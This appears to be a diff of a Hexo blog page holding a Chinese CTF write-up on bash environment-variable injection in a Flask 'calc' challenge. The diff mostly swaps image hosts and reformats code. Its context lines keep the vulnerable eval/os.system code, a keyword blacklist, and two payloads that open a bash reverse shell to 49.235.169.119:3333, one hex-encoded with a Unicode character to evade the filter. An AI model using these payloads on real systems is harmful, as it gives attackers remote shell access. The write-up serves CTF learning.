@@ -32,16 +32,16 @@
 <meta property="og:site_name" content="Blog">
 <meta property="og:description" content="p神  学习知识起始是想利用这一段代码 1234567&lt;?phpforeach($_REQUEST[&#x27;envs&#x27;] as $key &#x3D;&gt; $val) &#123;    putenv(&quot;&#123;$key&#125;&#x3D;&#123;$val&#125;&quot;);&#125;&#x2F;&#x2F;... 一些其他代码system(&#x27;echo hello&amp;#x2">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.ibb.co/h1rtcrZ/1.png">
-<meta property="og:image" content="https://i.ibb.co/RTzyMrW/2.png">
-<meta property="og:image" content="https://i.postimg.cc/jdjfvhKz/3.png">
-<meta property="og:image" content="https://i.postimg.cc/jjYLV6V3/9d567346f5914d8ba1458c618693f2ed.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240048335.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240047115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240047438.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240048800.png">
 <meta property="article:published_time" content="2024-03-07T03:25:04.000Z">
-<meta property="article:modified_time" content="2024-03-07T03:26:42.205Z">
+<meta property="article:modified_time" content="2024-04-23T16:48:54.227Z">
 <meta property="article:author" content="hanggerui88">
 <meta property="article:tag" content="环境变量注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.ibb.co/h1rtcrZ/1.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240048335.png">
   
     <link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
   
@@ -274,18 +274,18 @@
 </ul>
 <h2><span id="例题">例题</span></h2><p>nss   calc</p>
 <p>fask框架，<font color="cornflowerblue">?num[]&#x3D;1</font>报错会出现防火墙的那一半代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/calc&quot;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def calc():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(&quot;num&quot;)</span><br><span class="line">    log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;, time.localtime()), ip,num)</span><br><span class="line">    if waf(num):</span><br><span class="line">        try:</span><br><span class="line">            data = eval(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return str(data)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;waf!!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(s):</span><br><span class="line">    blacklist = [&#x27;import&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;#&#x27;, &#x27;@&#x27;, &#x27;^&#x27;, &#x27;$&#x27;, &#x27;,&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;`&#x27;, &#x27; &#x27;, &#x27;_&#x27;, &#x27;|&#x27;, &#x27;;&#x27;, &#x27;&quot;&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;&amp;&#x27;,</span><br><span class="line">                 &#x27;getattr&#x27;, &#x27;os&#x27;, &#x27;system&#x27;, &#x27;class&#x27;, &#x27;subclasses&#x27;, &#x27;mro&#x27;, &#x27;request&#x27;, &#x27;args&#x27;, &#x27;eval&#x27;, &#x27;if&#x27;, &#x27;subprocess&#x27;,</span><br><span class="line">                 &#x27;file&#x27;, &#x27;open&#x27;, &#x27;popen&#x27;, &#x27;builtins&#x27;, &#x27;compile&#x27;, &#x27;execfile&#x27;, &#x27;from_pyfile&#x27;, &#x27;config&#x27;, &#x27;local&#x27;, &#x27;self&#x27;,</span><br><span class="line">                 &#x27;item&#x27;, &#x27;getitem&#x27;, &#x27;getattribute&#x27;, &#x27;func_globals&#x27;, &#x27;__init__&#x27;, &#x27;join&#x27;, &#x27;__dict__&#x27;]</span><br><span class="line">    flag = True</span><br><span class="line">    for no in blacklist:</span><br><span class="line">        if no.lower() in s.lower():</span><br><span class="line">            flag = False</span><br><span class="line">            print(no)</span><br><span class="line">            break</span><br><span class="line">    return flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip,num)</span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
 
 <p> python中运用。同样python3中system函数底层代码实现中也调用了<font color="red">&#x2F;bin&#x2F;sh -c</font>来执行shell命令 </p>
 <blockquote>
 <p>利用的知识点</p>
 <p>Python[]绕过空格实现变量覆盖</p>
 </blockquote>
-<p><img src="https://i.ibb.co/h1rtcrZ/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240048335.png"></p>
 <p>本地创建一个变量，成功</p>
-<p><img src="https://i.ibb.co/RTzyMrW/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240047115.png"></p>
 <p>测试一下在python，成功</p>
-<p><img src="https://i.postimg.cc/jdjfvhKz/3.png"></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240047438.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=[[str][0]for[os.environ[&#x27;BASH_FUNC_hello%%&#x27;]]in[[&#x27;() &#123; bash -i &gt;&amp; /dev/tcp/49.235.169.119/3333 0&gt;&amp;1; &#125;&#x27;]]]</span><br></pre></td></tr></table></figure>
 
 <p>接下来是黑名单绕过</p>
@@ -294,7 +294,7 @@
 <p>绕过os :python在处理utf-8中的非ascii字符的时候，会被转化成统一的标准格式。</p>
 <p>可以用ᵒ来代替o </p>
 </blockquote>
-<p><img src="https://i.postimg.cc/jjYLV6V3/9d567346f5914d8ba1458c618693f2ed.png"></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240048800.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[str][0]for[ᵒs.environ[&#x27;BASH\x5fFUNC\x5fhello%%&#x27;]]in[[&#x27;\x28\x29\x20\x7b\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x34\x39\x2e\x32\x33\x35\x2e\x31\x36\x39\x2e\x31\x31\x39\x2f\x33\x33\x33\x33\x20\x30\x3e\x26\x31\x3b\x20\x7d&#x27;]]]</span><br></pre></td></tr></table></figure>
 
 <h3><span id="非预期解">非预期解</span></h3><blockquote>
@@ -351,14 +351,14 @@
       
         
         
-          <img data-src="/images/banner.jpg" data-sizes="auto" alt="Cute HTTP File Server" class="lazyload">
+          <img data-src="/images/banner.jpg" data-sizes="auto" alt="" class="lazyload">
         
       
-      <a href="/2024/03/05/wp/Cute-HTTP-File-Server/"></a>
+      <a href="/2024/03/07/wp/Cute-HTTP-File-Server/"></a>
       <div class="article-nav-caption">Older</div>
       <h3 class="article-nav-title">
         
-          Cute HTTP File Server
+          (no title)
         
       </h3>
     </div>
@@ -392,7 +392,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">19</div>
+    <div class="sidebar-state-number">18</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -473,7 +473,7 @@
           24.1k
           &nbsp;|&nbsp;
           <span class="icon-coffee"></span>
-          01:51
+          01:50
         </div>
       
       
@@ -511,7 +511,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">19</div>
+    <div class="sidebar-state-number">18</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
